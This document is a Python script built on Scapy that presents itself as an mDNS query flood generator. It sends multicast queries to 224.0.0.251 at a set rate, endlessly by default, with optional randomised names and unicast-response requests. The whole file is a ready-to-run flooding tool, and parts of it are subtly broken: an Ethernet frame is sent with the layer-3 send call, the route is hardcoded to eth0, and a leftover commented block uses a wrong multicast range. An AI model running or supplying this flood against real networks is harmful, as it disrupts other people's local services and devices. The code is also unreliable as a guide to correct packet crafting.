#!/usr/bin/env python3
"""mDNS query flood generator implemented with Scapy."""

from __future__ import annotations

import argparse
import random
import string
import sys
import time

from scapy.all import DNS, DNSQR, IP, UDP, Ether, conf, get_if_addr, send, conf

MDNS_MCAST_IP = "224.0.0.251"
MDNS_PORT = 5353

QTYPE_MAP = {
    "A": 1,
    "PTR": 12,
    "TXT": 16,
    "AAAA": 28,
    "SRV": 33,
    "ANY": 255,
}


def random_label(rng: random.Random, length: int = 12) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(rng.choice(alphabet) for _ in range(length))


def build_query_packet(src_ip: str, qname: str, qtype: int, unicast_response: bool) -> IP:
    print("**** -- SRCIP:", src_ip)
    question = DNSQR(qname=qname, qtype=qtype, qclass=0x8001 if unicast_response else 0x0001)
    return (
        Ether(dst="ff:ff:ff:ff:ff:ff") 
        / IP(src=src_ip, dst=MDNS_MCAST_IP, ttl=255)
        / UDP(sport=MDNS_PORT, dport=MDNS_PORT)
        / DNS(
            id=random.randint(0, 0xFFFF),
            qr=0,
            opcode=0,
            aa=0,
            rd=0,
            qdcount=1,
            qd=question,
        )
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="mDNS query flood generator using Scapy")
    parser.add_argument("--iface", required=True, help="Interface to send on")
    parser.add_argument("--name", default="_services._dns-sd._udp", help="Base mDNS name to query")
    parser.add_argument("--qtype", default="PTR", help="DNS query type: A, PTR, TXT, AAAA, SRV, ANY")
    parser.add_argument("--pps", type=float, default=100.0, help="Queries per second")
    parser.add_argument("--count", type=int, default=0, help="Queries to send, 0 means forever")
    parser.add_argument("--randomize-name", action="store_true", help="Prefix each query with a random label")
    parser.add_argument("--label-length", type=int, default=12, help="Length of random label when randomizing")
    parser.add_argument("--seed", type=int, help="Random seed")
    parser.add_argument("--unicast-response", action="store_true", help="Request unicast responses")
    args = parser.parse_args()

    qtype_name = args.qtype.upper()
    qtype = QTYPE_MAP.get(qtype_name)
    if qtype is None:
        print(f"unsupported qtype: {args.qtype}", file=sys.stderr)
        return 1
    if args.pps <= 0:
        print("--pps must be greater than 0", file=sys.stderr)
        return 1
    if args.label_length <= 0:
        print("--label-length must be greater than 0", file=sys.stderr)
        return 1

    conf.checkIPaddr = False
    rng = random.Random(args.seed)
    src_ip = get_if_addr(args.iface)
    base_name = args.name.rstrip(".")
    interval = 1.0 / args.pps
    sent = 0

    conf.route
    conf.route.add(host="224.0.0.251", dev="eth0")
    print(
        f"sending mDNS query flood iface={args.iface} src={src_ip} "
        f"qtype={qtype_name} pps={args.pps} count={'infinite' if args.count == 0 else args.count}"
    )

    try:
        while args.count == 0 or sent < args.count:
            query_name = base_name
            if args.randomize_name:
                query_name = f"{random_label(rng, args.label_length)}.{base_name}"
            packet = build_query_packet(src_ip, f"{query_name}.", qtype, args.unicast_response)
            print("---SEND ", args.iface)
            send(packet, iface=args.iface, verbose=True)
            sent += 1
            if sent <= 5 or sent % 100 == 0:
                print(f"sent={sent} qname={query_name}.")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("Permission denied. Run as root to send mDNS packets.", file=sys.stderr)
        return 1

    print(f"done sent={sent}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())







# from scapy.all import IP, UDP, DNS, DNSQR, send, conf

# # Define the target mDNS multicast address and port
# mdns_ip = "240.0.0.0/4"
# mdns_port = 5353
# conf.iface = "eth0"

# # Craft the mDNS query packet
# # qname: The local hostname you want to resolve
# # qtype: "PTR" for service discovery or "A" for a specific host IP
# print("SEINDING: ", mdns_ip)
# packet = IP(dst=mdns_ip) / \
#          UDP(sport=mdns_port, dport=mdns_port) / \
#          DNS(rd=0, qd=DNSQR(qname="raspberrypi.local"))

# # Send the packet
# send(packet)